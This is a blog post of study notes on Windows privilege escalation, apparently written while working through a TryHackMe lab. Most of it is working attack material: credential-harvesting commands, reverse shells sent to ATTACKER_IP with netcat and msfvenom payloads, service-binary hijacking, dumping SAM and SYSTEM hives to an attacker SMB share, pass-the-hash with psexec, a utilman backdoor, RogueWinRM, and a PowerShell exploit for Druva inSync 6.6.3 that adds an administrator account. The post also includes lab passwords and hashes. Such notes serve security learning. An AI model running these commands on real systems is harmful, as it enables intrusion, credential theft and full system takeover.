---
layout: post
title: Windows Privilege Escalation
---

# Index
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Harvesting Passwords from Usual Spots](#harvesting-passwords-from-usual-spots)
    - [Unattended Windows Installations](#unattended-windows-installations)
- [Powershell History](#powershell-history)
- [Saved Windows Credentials](#saved-windows-credentials)
- [Internet Information Services (IIS) Configuration](#internet-information-services-iis-configuration)
- [Retrieve Credentials from Software: PuTTY](#retrieve-credentials-from-software-putty)
- [Other Quick Wins](#other-quick-wins)
    - [Scheduled Tasks](#scheduled-tasks)
        - [Simple privilege escalation](#simple-privilege-escalation)
    - [AlwaysInstallElevated](#alwaysinstallelevated)
- [Abusing Service Misconfigurations](#abusing-service-misconfigurations)
    - [Windows services](#windows-services)
    - [Insecure Permissions on Service Executable](#insecure-permissions-on-service-executable)
    - [Unquoted Service Paths](#unquoted-service-paths)
        - [The administrator example](#the-administrator-example)
    - [Insecure Service Permissions](#insecure-service-permissions)
- [Abusing dangerous privileges](#abusing-dangerous-privileges)
    - [Windows Privileges](#windows-privileges)
    - [SeBackup / SeRestore](#sebackup--serestore)
    - [SeTakeOwnership](#setakeownership)
    - [SeImpersonate / SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
- [Abusing Vulnerable Software](#abusing-vulnerable-software)
    - [Unpatched Software](#unpatched-software)
    - [Druva inSync 6.6.3](#druva-insync-663)
- [Tools](#tools)
    - WinPEAS
    - PrivescCheck
    - Windows Exploit Suggester - Next Generation (WES-NG)
    - Metasploit

Unprivileged users hold limited access, their files and folders only

# Windows Privilege Escalation
**Privilege escalation**: Given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system.

**Weaknesses**
- Misconfigurations windows services or scheduled tasks.
- Excessive privileges
- Vulnerable software
- Missing windows security patches

**Windows users**
- **Administrators**
    - The most privileges
    - Change system configuration
    - Access any file in the system.
    - **Administrators** group
- **Standard Users**
    - Only limited to their files.
    - **Users** group

**Special built-in accounts**
- **SYSTEM / LocalSystem**
    - Used by the operating system
    - Perform internal tasks
    - Full access to all files and resources on the host.
    - Higher privileges than administrators.
- **Local Service**
    - Default account
    - Runs windows services with "minimum" privileges.
    - Use anonymous connections over the network.
- **Network Service**
    - Default account
    - Runs windows services with "minimum" privileges.
    - Use the computer credentials to authenticate through the network.

# Harvesting Passwords from Usual Spots
## Unattended Windows Installations
**Windows Deployment Services**: A single operating system image to be deployed to several hosts through the network.
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

{% highlight diff %}
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
{% endhighlight %}

## Powershell History
If a user runs a command that includes a password directly as part of the Powershell command line.

>Command Prompt
{:.filename}
{% highlight diff %}
-type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
{% endhighlight %}

## Saved Windows Credentials
List saved credentials

>Command Prompt
{:.filename}
{% highlight diff %}
-cmdkey /list

-runas /savecred /user:admin cmd.exe
{% endhighlight %}

## Internet Information Services (IIS) Configuration
- The default web server.
- **Configuration**, Store passwords for databases or configured authentication
    - `C:\inetpub\wwwroot\web.config`
    - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

To find database connection strings
>Powershell
{:.filename}
{% highlight diff %}
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
{% endhighlight %}

## Retrieve Credentials from Software: PuTTY
- An SSH client
- Users can store sessions where the IP, user and other configurations can be stored for later use.
- Won't store ssh password
- Will store proxy configurations with cleartext authentication credentials.
- To retrieve the stored proxy credentials, Registry key for ProxyPassword.

>Command Prompt
{:.filename}
{% highlight diff %}
-reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
{% endhighlight %}

# Other Quick Wins
## Scheduled Tasks
Detailed information about the services.
>Command Prompt
{:.filename}
{% highlight diff %}
-schtasks

-schtasks /query /tn vulntask /fo list /v
{% endhighlight %}
- **Task To Run**, What gets executed.
- **Run As User**, Which shows the user that will be used to execute the task.

### Simple privilege escalation
Check the permissions on the executable

>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> icacls C:\tasks\schtask.bat

c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
{% endhighlight %}
- The BUILTIN\Users group has full access (F).

Modify the .bat file to spawn a reverse shell.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
{% endhighlight %}

Start a listener on the attacker machine
>Terminal
{:.filename}
{% highlight diff %}
-nc -lvp 4444
{% endhighlight %}

>Command Prompt
{:.filename}
{% highlight diff %}
-schtasks /run /tn vulntask
{% endhighlight %}

>Terminal
{:.filename}
{% highlight diff %}
-nc -lvp 4444
listening on [any] 4444 ...
connect to [10.64.92.220] from ip-10-64-149-9.ec2.internal [10.64.149.9] 49797
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

-C:\Windows\system32>
{% endhighlight %}

## AlwaysInstallElevated
**Windows installer files** (.msi): To install applications on the system.

Requires two registry values to be set.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
{% endhighlight %}

Generate a malicious .msi file
>Terminal
{:.filename}
{% highlight diff %}
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
{% endhighlight %}

Run the installer and receive the reverse shell.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
{% endhighlight %}

# Abusing Service Misconfigurations
## Windows services
- **Service Control Manager (SCM)**: Managing the state of services, Checking the current status of services & configure services.
- Each service has an associated executable which will be run by the SCM whenever a service is started.

Query the apphostsvc service configuration.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
{% endhighlight %}
- `BINARY_PATH_NAME`: The executable
- `SERVICE_START_NAME`: The account used to run the service.

**Discretionary Access Control List (DACL)**: Who has permission to start, stop, pause, query status, query configuration, or reconfigure the service.
**Services configurations**: `HKLM\SYSTEM\CurrentControlSet\Services\`

A subkey exists for every service in the system, only administrators can modify registry entries by default.
- **ImagePath**: The executable
- **ObjectName**: The account used to start the service.
- **Security**: Discretionary Access Control List (DACL)

## Insecure Permissions on Service Executable
Allows an attacker to modify or replace it, the attacker can gain the privileges of the service's account.

Query the WindowsScheduler service configuration
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
{% endhighlight %}

Check the permissions on the executable
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
{% endhighlight %}
- The everyone group has modify permissions (M)


Generate an exe-service reverse shell payload
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
{% endhighlight %}

Python webserver
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ python3 -m http.server
{% endhighlight %}

Pull the payload
>Powershell
{:.filename}
{% highlight diff %}
-wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-SVC.exe
{% endhighlight %}

Replace the service executable with the payload.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> cd C:\PROGRA~2\SYSTEM~1\

-C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

-C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.
{% endhighlight %}

Grant full permissions to the Everyone group
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
{% endhighlight %}

Start a reverse listener
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4445
{% endhighlight %}

Restart the service
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc stop windowsscheduler

-C:\> sc start windowsscheduler
{% endhighlight %}
Note: PowerShell has sc as an alias to Set-Content

## Unquoted Service Paths
**Unquoted Executable**, The path of the executable isn't properly quoted to account for spaces on the command.

A proper quotation
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
{% endhighlight %}

Without a proper quotation
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
{% endhighlight %}

When the SCM executes the file, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder. The SCM doesn't know which file is trying to execute.

SCM tries to help the user and starts searching for each of the binaries.
1. `C:\\MyPrograms\\Disk.exe`
1. `C:\\MyPrograms\\Disk Sorter.exe`
1. `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`

If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

Most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users.

Some installers change the permissions on the installed folders, making the services vulnerable.

### The administrator example 
An administrator might decide to install the service binaries in a non-default path, the vulnerability can be exploited.

The administrator installed the Disk Sorter binaries under `C:\MyPrograms`

Check the permissions on the folder
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
{% endhighlight %}
- the `BUILTIN\Users` group has AD and WD privileges, allowing the user to create subdirectories and files.

Generate an exe-service reverse shell payload
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
{% endhighlight %}

Python webserver
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ python3 -m http.server
{% endhighlight %}

Pull the payload
>Powershell
{:.filename}
{% highlight diff %}
-wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
{% endhighlight %}

Replace the service executable with the payload.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
{% endhighlight %}

Grant full permissions to the Everyone group
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
{% endhighlight %}

Start a reverse listener
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4446
{% endhighlight %}

Restart the service
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc stop "disk sorter enterprise"

-C:\> sc start "disk sorter enterprise"
{% endhighlight %}

>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

+C:\Windows\system32>whoami
wprivesc1\svcusr2
{% endhighlight %}

## Insecure Service Permissions
**Service DACL**, allow to modify the configuration of a service. Reconfigure the service, to point to any executable & run it with any account including SYSTEM.

Check for a service DACL
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
{% endhighlight %}
- `BUILTIN\Users`, Any user can reconfigure the service.

Generate an exe-service reverse shell payload
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
{% endhighlight %}

Python webserver
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ python3 -m http.server
{% endhighlight %}

Pull the payload
>Powershell
{:.filename}
{% highlight diff %}
-wget http://ATTACKER_IP:8000/rev-svc3.exe -O C:/Users/thm-unpriv/rev-svc3.exe
{% endhighlight %}

Grant full permissions to the Everyone group
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
{% endhighlight %}

Change the service's associated executable and account
>Command Prompt
{:.filename}
{% highlight diff %}
-sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
{% endhighlight %}
- `LocalSystem`, The highest privileged account available.

Start a reverse listener
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4447
{% endhighlight %}

Restart the service
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> sc stop THMService

-C:\> sc start THMService
{% endhighlight %}

>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

+C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
{% endhighlight %}

# Abusing dangerous privileges
## Windows Privileges
Check user privilege
>Command Prompt
{:.filename}
{% highlight diff %}
-whoami /priv
{% endhighlight %}

## SeBackup / SeRestore
>Terminal
{:.filename}
{% highlight diff %}
-xfreerdp3 /u:THMBackup /p:CopyMaster555 /v:10.65.129.26
{% endhighlight %}

- Allow users to read and write to any file in the system.
- To allow certain users to perform backups from a system without requiring full administrative privileges.
- Part of the `Backup Operators` group.

Open a command prompt, `Open as administrator`. Check user privilege
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
{% endhighlight %}

To backup the SAM and SYSTEM hashes
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> reg save hklm\system C:\Users\THMBackup\system.hive

-C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
{% endhighlight %}

Copy these files to our attacker machine using SMB.
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ mkdir share

-user@attackerpc$ python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

-user@attackerpc$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
{% endhighlight %}

Creates a share named `public` WIN pointing to the `share` LINUX directory

Transfer both files to `public`.
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
-C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
{% endhighlight %}

Retrieve the users' password hashes
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

-user@attackerpc$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 
{% endhighlight %}

Perform a Pass-the-Hash attack
>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.66.149.94

-user@attackerpc$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.66.149.94
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.66.149.94.....
[*] Found writable share ADMIN$
[*] Uploading file SOFYXKwp.exe
[*] Opening SVCManager on 10.66.149.94.....
[*] Creating service VYVK on 10.66.149.94.....
[*] Starting service VYVK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

+C:\Windows\system32> 
{% endhighlight %}

## SeTakeOwnership
Allows a user to take ownership of any object on the system, files and registry keys.
- For example, search for a service running as SYSTEM and take ownership of the service's executable.

>Terminal
{:.filename}
{% highlight diff %}
-xfreerdp3 /u:THMTakeOwnership /p:TheWorldIsMine2022 /v:10.65.129.26
{% endhighlight %}

Open a command prompt, `Open as administrator`. Check user privilege
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
{% endhighlight %}

**Utilman**, A built-in windows application used to provide Ease of Access options during the lock screen.
- Is run with SYSTEM privileges

Take ownership
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> takeown /f C:\Windows\System32\utilman.exe
{% endhighlight %}

Give the user full permissions
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> icacls C:\Windows\System32\utilman.exe /grant THMTakeOwnership:F
{% endhighlight %}

Replace utilman.exe with a copy of cmd.exe
>Command Prompt
{:.filename}
{% highlight diff %}
-C:\> copy cmd.exe utilman.exe
{% endhighlight %}

## SeImpersonate / SeAssignPrimaryToken
Allow a process to impersonate other users and act on their behalf.

1. A website running on IIS, web shell. Visit, `http://<WINDOWS-IP-ADDRESS>/`
1. The web shell to check for the assigned privileges of the compromised account, `whoami /priv`
1. The exploit, `C:\tools\`
        - Creates a connection to port 5985 using SYSTEM privileges.
        - Port 5985 is used for the WinRM service, a port that exposes a Powershell console to be used remotely through the network.
        - If the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting.
        - If the attacker has SeImpersonate privileges, he can execute any command as SYSTEM.
1. Start a netcat listener to receive a reverse shell, `nc -lvp 4442`
1. Web shell to trigger the RogueWinRM exploit, `C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
1. A shell with SYSTEM privileges

>Terminal
{:.filename}
{% highlight diff %}
-user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

+c:\windows\system32\inetsrv>whoami
nt authority\system
{% endhighlight %}

# Abusing Vulnerable Software
## Unpatched Software
- `wmic`, To list software installed on the system and its versions.
- `wmic product`, May not return all installed programs.
- `https://www.exploit-db.com`, Search for existing exploits

## Druva inSync 6.6.3
The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only.

**Procedure 5**: Allowed anyone to request the execution of any command, gets executed with SYSTEM privileges.

1. **First packet**: Hello packet
1. **Second packet**: Execute procedure number 5
1. **Thrid packet**: Send the length of the command
1. **Fourth packet**: The command string to be executed

>code.ps1
{:.filename}
{% highlight shell linenos %}
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
{% endhighlight %}
- Create user `pwnd` with a password of `SimplePass123` with administrators' group.

Verify the user pwnd exists & is part of the administrators' group.
{% highlight diff linenos %}
-net user pwnd
{% endhighlight %}

# Tools
## WinPEAS
## PrivescCheck
## Windows Exploit Suggester - Next Generation (WES-NG)
## Metasploit